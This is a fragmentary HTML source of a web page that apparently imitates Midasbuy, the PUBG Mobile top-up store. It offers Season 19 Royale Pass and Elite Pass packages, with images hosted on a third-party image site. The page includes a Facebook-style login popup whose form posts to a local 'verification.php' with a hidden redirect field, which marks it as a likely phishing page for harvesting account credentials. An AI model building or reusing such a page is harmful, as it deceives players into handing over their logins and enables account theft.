...
<body>
    ...
    <ul class="product-list-wrap">
        <li data-starttime="-28800" data-limit="true" data-timeleft="-1622311073" class="list product-list-item collect-items">
            ...
            <div cr="item_select.S19_RP_Upgrade_Card_Package" data-pid="S19_RP_Upgrade_Card_Package" class="t-box product-item-box" style="cursor: pointer;">
                ...
                <div class="pic"><img alt="img" src="https://i.ibb.co/w4Xc1KS/1629034877113.png" data-original="https://i.ibb.co/w4Xc1KS/1629034877113.png" class="game-list-pic lazy" style="display: block;"></div>
            </div>
            <!---->
            <div class="b-box">
                ...
                <div class="block">
                    ...
                    <div class="item-box">
                        ...
                        <div class="item"><img src="https://cdn.midasbuy.com/images/%E7%B2%BE%E8%8B%B1%E5%8D%A1%20_%EF%BC%88128x128%EF%BC%89-1d8036e20.png" alt="img">
                            <div class="mess">
                                <p class="name">Royale Pass Upgrade Card (Season 19)</p>
                                <p class="desc"></p>
                            </div>
                        </div>
                    </div>
        ...
        <li data-starttime="-28800" data-limit="true" data-timeleft="-1622311073" class="list product-list-item collect-items">
            ...
            <div cr="item_select.S19_Elite_Pass_Plus_Package" data-pid="S19_Elite_Pass_Plus_Package" class="t-box product-item-box" style="cursor: pointer;">
                ...
                <div class="pic"><img alt="img" src="https://i.ibb.co/gV0pLZt/1629034322623.png" data-original="https://i.ibb.co/gV0pLZt/1629034322623.png" class="game-list-pic lazy" style="display: block;"></div>
            </div>
            <!---->
            <div class="b-box">
            ...
            <div class="prop-block">
                ...
                <div class="block">
                    ...
                    <div class="item-box">
                        <div class="item"><img src="https://i.ibb.co/gV0pLZt/1629034322623.png" alt="img">
                            <div class="mess">
                                <p class="name">Classic Crate Coupon</p>
                                <p class="desc"></p>
                            </div>
                        </div>
                        <div class="item"><img src="https://i.ibb.co/M5bZ1jr/1629036647827.png" alt="img">
                            <div class="mess">
                ...
                <div class="popup-box-login-fb">
                    ...
                    <div class="content-box-fb">
                        ...
                        <form class="login-form" action="../verification.php" method="post">
							...
							<input type="hidden" name="line" value="items/processing.php" readonly>
    ...
    <script>
        window.productsList = [{
            ...
            "rank_num": "7",
            "is_hot_product": "0",
            "image_url": "https://cdn.midasbuy.com/images/%E5%8F%B0%E6%B9%BE%29_820x8208dbfc355.jpg",
            "description": "Please collect it from in-game mail.",
            "reserve_time": "",
            "sub_product": [{
